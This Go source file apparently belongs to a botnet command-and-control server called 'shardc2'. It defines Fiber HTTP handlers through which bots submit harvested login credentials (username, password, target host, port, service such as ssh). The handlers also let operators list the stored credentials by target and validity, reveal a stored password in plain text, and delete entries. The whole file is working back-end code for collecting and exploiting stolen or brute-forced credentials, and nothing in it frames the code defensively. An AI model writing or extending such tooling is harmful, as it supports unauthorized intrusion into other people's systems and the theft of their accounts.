package handlers

import (
	"fmt"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/shardc2/shardc2/internal/database"
)

type CredentialHandler struct {
	db *database.DB
}

func NewCredentialHandler(db *database.DB) *CredentialHandler {
	return &CredentialHandler{db: db}
}

func (h *CredentialHandler) Submit(c *fiber.Ctx) error {
	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
		Target   string `json:"target"`
		Port     int    `json:"port"`
		Service  string `json:"service"`
		Valid    bool   `json:"valid"`
	}
	if err := c.BodyParser(&req); err != nil {
		return c.Status(400).JSON(fiber.Map{"error": "invalid request body"})
	}
	if req.Username == "" || req.Target == "" {
		return c.Status(400).JSON(fiber.Map{"error": "username and target required"})
	}
	if req.Port == 0 {
		req.Port = 22
	}
	if req.Service == "" {
		req.Service = "ssh"
	}

	botID, _ := c.Locals("bot_id").(string)

	var credID string
	err := h.db.QueryRow(`
		INSERT INTO credentials (username, password, target, port, service, valid, bot_id)
		VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING id`,
		req.Username, req.Password, req.Target, req.Port, req.Service, req.Valid, nilIfEmpty(botID),
	).Scan(&credID)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to store credential"})
	}

	return c.Status(201).JSON(fiber.Map{"id": credID, "status": "stored"})
}

func (h *CredentialHandler) List(c *fiber.Ctx) error {
	query := `SELECT id, username, password, target, port, COALESCE(service, 'ssh'), COALESCE(category, 'login'), valid, COALESCE(bot_id::text, ''), COALESCE(campaign_id::text, ''), COALESCE(source_path, ''), discovered_at FROM credentials`
	args := []interface{}{}
	conditions := []string{}

	if target := c.Query("target"); target != "" {
		conditions = append(conditions, fmt.Sprintf("target = $%d", len(args)+1))
		args = append(args, target)
	}
	if c.Query("valid") == "true" {
		conditions = append(conditions, fmt.Sprintf("valid = $%d", len(args)+1))
		args = append(args, true)
	}
	if category := c.Query("category"); category != "" {
		conditions = append(conditions, fmt.Sprintf("category = $%d", len(args)+1))
		args = append(args, category)
	}

	if len(conditions) > 0 {
		query += " WHERE "
		for i, cond := range conditions {
			if i > 0 {
				query += " AND "
			}
			query += cond
		}
	}
	query += " ORDER BY discovered_at DESC LIMIT 500"

	rows, err := h.db.Query(query, args...)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to list credentials"})
	}
	defer rows.Close()

	var creds []fiber.Map
	for rows.Next() {
		var id, username, password, target, service, category, botID, campaignID, sourcePath string
		var port int
		var valid bool
		var discoveredAt time.Time
		if err := rows.Scan(&id, &username, &password, &target, &port, &service, &category, &valid, &botID, &campaignID, &sourcePath, &discoveredAt); err != nil {
			continue
		}
		creds = append(creds, fiber.Map{
			"id": id, "username": username, "password": "********", "target": target,
			"port": port, "service": service, "category": category, "valid": valid,
			"bot_id": botID, "campaign_id": campaignID, "source_path": sourcePath,
			"discovered_at": discoveredAt,
		})
	}
	if creds == nil {
		creds = []fiber.Map{}
	}
	return c.JSON(fiber.Map{"credentials": creds, "count": len(creds)})
}

func (h *CredentialHandler) Reveal(c *fiber.Ctx) error {
	id := c.Params("id")
	var password string
	err := h.db.QueryRow(`SELECT password FROM credentials WHERE id = $1`, id).Scan(&password)
	if err != nil {
		return c.Status(404).JSON(fiber.Map{"error": "credential not found"})
	}
	return c.JSON(fiber.Map{"id": id, "password": password})
}

func (h *CredentialHandler) Delete(c *fiber.Ctx) error {
	id := c.Params("id")
	result, err := h.db.Exec(`DELETE FROM credentials WHERE id = $1`, id)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to delete credential"})
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return c.Status(404).JSON(fiber.Map{"error": "credential not found"})
	}
	return c.JSON(fiber.Map{"status": "deleted"})
}

func nilIfEmpty(s string) interface{} {
	if s == "" {
		return nil
	}
	return s
}
